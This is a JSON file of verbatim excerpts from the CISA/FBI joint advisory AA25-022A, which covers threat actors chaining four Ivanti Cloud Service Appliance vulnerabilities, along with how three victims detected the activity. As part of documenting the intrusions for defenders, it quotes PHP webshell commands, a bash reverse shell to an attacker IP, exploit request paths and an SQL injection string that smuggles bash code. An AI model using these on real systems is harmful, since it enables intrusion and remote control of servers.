@@ -1,0 +1,154 @@
+[
+ {
+  "id": "p1",
+  "text": "# CISA/FBI AA25-022A — Threat Actors Chained Vulnerabilities in Ivanti Cloud Service Applications"
+ },
+ {
+  "id": "p2",
+  "text": "> - Publisher: CISA and FBI, Joint Cybersecurity Advisory, Product ID AA25-022A, January 22, 2025 (TLP:CLEAR)\n> - Download URL (FBI IC3 copy of the joint advisory): https://www.ic3.gov/CSA/2025/250122.pdf\n> - CISA web page (not fetched; returns 403 from the retrieval host): https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a\n> - PDF SHA-256: 00ca2a6b38245d06f085e2ab1ee747ebf178cf2c3c1537319af7e52090526adf (`source.pdf`, 37 pages)\n> - License: U.S. Government work, TLP:CLEAR\n> - Scope of this file: the note under the title and Summary (pp.1–2, without the reporting box), and Technical Details through \"Detection of Activity\" (pp.4–6), verbatim. IOC tables, ATT&CK tables, incident response, mitigations and Appendices A–B (decoded scripts, sudo commands) are in `source.pdf.txt`.\n> - Retrieved: 2026-11-16\n> - Wording: the source's own wording; only page furniture, line wrapping and line-break hyphenation were removed. Source typos are kept (for example \"administrate bypass\", \"4.6x versions before 519\", \"./k\" vs \"/.k\")."
+ },
+ {
+  "id": "p3",
+  "text": "Note: The CVEs in this advisory are unrelated to vulnerabilities (CVE-2025-0282 and CVE-2025-0283) in Ivanti’s Connect Secure, Policy Secure and ZTA Gateways. For more information on mitigating CVE-2025-0282 and CVE-2025-0283, see Ivanti Releases Security Updates for Connect Secure, Policy Secure, and ZTA Gateways."
+ },
+ {
+  "id": "p4",
+  "text": "## Summary"
+ },
+ {
+  "id": "p5",
+  "text": "The Cybersecurity and Infrastructure Security Agency (CISA) and Federal Bureau of Investigation (FBI) are releasing this joint Cybersecurity Advisory in response to exploitation in September 2024 of vulnerabilities in Ivanti Cloud Service Appliances (CSA): CVE-2024-8963, an administrative bypass vulnerability; CVE-2024-9379, a SQL injection vulnerability; and CVE-2024-8190 and CVE-2024-9380, remote code execution vulnerabilities."
+ },
+ {
+  "id": "p6",
+  "text": "According to CISA and trusted third-party incident response data, threat actors chained the listed vulnerabilities to gain initial access, conduct remote code execution (RCE), obtain credentials, and implant webshells on victim networks. The actors’ primary exploit paths were two vulnerability chains. One exploit chain leveraged CVE-2024-8963 in conjunction with CVE-2024-8190 and CVE-2024-9380 and the other exploited CVE-2024-8963 and CVE-2024-9379. In one confirmed compromise, the actors moved laterally to two servers."
+ },
+ {
+  "id": "p7",
+  "text": "All four vulnerabilities affect Ivanti CSA version 4.6x versions before 519, and two of the vulnerabilities (CVE-2024-9379 and CVE-2024-9380) affect CSA versions 5.0.1 and below; according to Ivanti, these CVEs have not been exploited in version 5.0.[1]"
+ },
+ {
+  "id": "p8",
+  "text": "Ivanti CSA 4.6 is End-of-Life (EOL) and no longer receives patches or third-party libraries. CISA and FBI strongly encourage network administrators to upgrade to the latest supported version of Ivanti CSA."
+ },
+ {
+  "id": "p9",
+  "text": "Network defenders are encouraged to hunt for malicious activity on their networks using the detection methods and indicators of compromise (IOCs) within this advisory. Credentials and sensitive data stored within the affected Ivanti appliances should be considered compromised. Organizations should collect and analyze logs and artifacts for malicious activity and apply the incident response recommendations within this advisory."
+ },
+ {
+  "id": "p10",
+  "text": "## Technical Details"
+ },
+ {
+  "id": "p11",
+  "text": "Note: This advisory uses the MITRE ATT&CK® Matrix for Enterprise framework, version 16. See the MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques."
+ },
+ {
+  "id": "p12",
+  "text": "In September 2024, Ivanti released two Security Advisories disclosing exploitation of CVE-2024-8190 and CVE-2024-8963.[2][3] In October 2024, Ivanti released another advisory disclosing exploitation of CVE-2024-9379 and CVE-2024-9380.[1]"
+ },
+ {
+  "id": "p13",
+  "text": "- CVE-2024-8963 [CWE-22: Path Traversal] is an administrate bypass vulnerability that allows threat actors to remotely access restricted features within the appliance. When used in conjunction with CVE-2024-8190 [CWE-78: OS Command Injection], threat actors can remotely authenticate into a victims’ network and execute arbitrary commands on the appliance [T1219].[2][3]\n- CVE-2024-9379 [CWE-89: SQL Injection] allows a remote authenticated attacker with admin privileges to run arbitrary SQL statements.[1]\n- CVE-2024-9380 [CWE-77: Command Injection] allows a remote authenticated attacker with admin privileges to obtain RCE.[1]"
+ },
+ {
+  "id": "p14",
+  "text": "According to Ivanti’s advisories and industry reporting, these vulnerabilities were exploited as zero days.[4] Based on evidence of active exploitation, CISA added CVE-2024-8963, CVE-2024-8190, CVE-2024-9379, and CVE-2024-9380 to its Known Exploited Vulnerabilities (KEV) Catalog."
+ },
+ {
+  "id": "p15",
+  "text": "According to CISA and trusted third-party incident response data, threat actors chained the above listed vulnerabilities to gain initial access, conduct RCE, obtain credentials, and implant webshells on victim networks. The primary exploit paths included two vulnerability chains. One exploit chain leveraged CVE-2024-8963 in conjunction with CVE-2024-8190 and CVE-2024-9380. The other chain exploited CVE-2024-8963 and CVE-2024-9379. After exploitation, the actors moved laterally in one victim—other victims had no follow-on activity because they identified anomalous activity and implemented mitigation measures."
+ },
+ {
+  "id": "p16",
+  "text": "### Exploit Chain 1"
+ },
+ {
+  "id": "p17",
+  "text": "The threat actors leveraged CVE-2024-8963 in conjunction with remote code execution vulnerabilities, CVE-2024-8190 and CVE-2024-9380. Acting as a nobody user [T1564.002], the threat actors first sent a GET request to datetime.php to acquire session and cross-site request forgery (CSRF) tokens using GET /client/index.php%3F.php/gsb/datetime[.]php [T1071.001]. They followed this in quick succession with a POST request to the same endpoint, using the TIMEZONE input field to manipulate the setSystemTimeZone function and execute code. In some confirmed compromises, the actors used this method to run base64-encoded Python scripts that harvested encrypted admin credentials from the database [T1552.001]. Note: The actors used multiple script variations. See Appendix A for examples of encoded and decoded scripts."
+ },
+ {
+  "id": "p18",
+  "text": "In some cases, the threat actors exfiltrated the encrypted admin credentials then decrypted them offline [TA0010]. In other cases, the threat actors leveraged an executable matching the regular expression php\\w{6} located in the /tmp directory to decrypt the credentials prior to exfiltration—this tool was unrecoverable."
+ },
+ {
+  "id": "p19",
+  "text": "After obtaining credentials, the actors logged in and exploited CVE-2024-9380 to execute commands from a higher privileged account. The actors successfully sent a GET request to /gsb/reports[.]php. They immediately followed this with a POST request using the TW_ID input field to execute code to implant webshells for persistence [T1505.003]."
+ },
+ {
+  "id": "p20",
+  "text": "In one confirmed compromise, the threat actors tried to create webshells using two different paths:"
+ },
+ {
+  "id": "p21",
+  "text": "```\necho \"<?php system(@\n\\$_REQUEST['a']);\">/opt/ivanti/csa/broker/webroot/client/help.php"
+ },
+ {
+  "id": "p22",
+  "text": "echo \"<?php system('/bin/sudo '. @\n\\$_REQUEST['a']);\" > /opt/landesk/broker/webroot/gsb/help.php\n```"
+ },
+ {
+  "id": "p23",
+  "text": "In the same compromise, the actors used the exploit to execute the following script to create a reverse Transmission Control Protocol command and control (C2) channel: bash -i >&/dev/tcp/107.173.89[.]16/8000 0>&1."
+ },
+ {
+  "id": "p24",
+  "text": "In another compromise, the threat actors maintained their presence on the victim’s system for a longer amount of time. The threat actors used sudo commands to disable the vulnerability in DateTimeTab.php, modify and remove webshells, and remove evidence of exploitation [T1548.003]. See Appendix B for the list of sudo commands used."
+ },
+ {
+  "id": "p25",
+  "text": "#### Lateral Movement"
+ },
+ {
+  "id": "p26",
+  "text": "In one case, there was evidence of lateral movement after the threat actors gained access and established a foothold through this exploit chain. It is suspected that the threat actors gained access into a Jenkins server running a vulnerable, outdated version [T1068]. Logs on the Jenkins machine showed that a command in the bash history contained credentials to the postgres server. The threat actors then attempted to log into the Virtual Private Network (VPN) server but were unsuccessful. Prior to moving laterally, the actors likely performed discovery on the CSA device using Obelisk and GoGo to scan for vulnerabilities [T1595.002]."
+ },
+ {
+  "id": "p27",
+  "text": "### Exploit Chain 2"
+ },
+ {
+  "id": "p28",
+  "text": "In one confirmed compromise, the actors used a similar exploit chain, exploiting CVE-2024-8963 in conjunction with CVE-2024-9379, using GET /client/index.php%3f.php/gsb/broker.php for initial access."
+ },
+ {
+  "id": "p29",
+  "text": "After the threat actors gained initial access, they attempted to exploit CVE-2024-9379 to create a webshell to gain persistent access. They executed GET and POST requests in quick succession to /client/index.php%3F.php/gsb/broker.php. In the POST body, threat actors entered the following string in the lockout attempts input box: LOCKOUTATTEMPTS = 1 ;INSERT INTO user_info(username, accessed, attempts) VALUES ('''echo -n TnNhV1Z1ZEM5b1pXeHdMbk>>/.k''', NOW(), 10). The first portion of the command (LOCKOUTATTEMPTS=1) fit the format of the application and was properly handled by the application. However, the second portion of the command, a SQL injection [T1190], was not properly handled by the application. Regardless, the application processed both commands, allowing the threat actors to insert a user into the user_info table."
+ },
+ {
+  "id": "p30",
+  "text": "After inserting valid bash code as a user in the user_info table, the threat actors attempted to login as the user. The authoring agencies believe the threat actors knew this login would fail but were attempting to coerce the application into handling the bash code improperly. In this attempt, the application did not evaluate the validity of the login, but instead ran echo -n TnNhV1Z1ZEM5b1pXeHdMbk>>./k as if it were code. The threat actors repeated the process of echo commands until they built a valid web shell [T1059]. However, there were no observations that the threat actors were successful."
+ },
+ {
+  "id": "p31",
+  "text": "### Detection of Activity"
+ },
+ {
+  "id": "p32",
+  "text": "According to incident response data from three victim organizations, the actors were unsuccessful with follow-on activity due to the organizations’ rapid detection of the malicious activity. To remediate exploitation, all three organizations replaced the virtual machines with clean and upgraded versions."
+ },
+ {
+  "id": "p33",
+  "text": "#### Victim Organization 1"
+ },
+ {
+  "id": "p34",
+  "text": "The first organization detected malicious activity early in the exploitation. A system administrator detected the anomalous creation of user accounts. After investigation, the organization remediated the incident. While it is likely admin credentials were exfiltrated, there were no signs of lateral movement."
+ },
+ {
+  "id": "p35",
+  "text": "#### Victim Organization 2"
+ },
+ {
+  "id": "p36",
+  "text": "This organization had an endpoint protection platform (EPP) installed on their system that alerted when the threat actors executed base64 encoded script to create webshells. There were no indications of webshells successfully being created or of lateral movement."
+ },
+ {
+  "id": "p37",
+  "text": "#### Victim Organization 3"
+ },
+ {
+  "id": "p38",
+  "text": "This organization leveraged the IOC findings from the other two victim sites to quickly detect malicious activity. This threat activity included the download and deployment of Obelisk and GoGo Scanner, which generated a large number of logs. The organization used these logs to identify anomalous activity."
+ }
+]
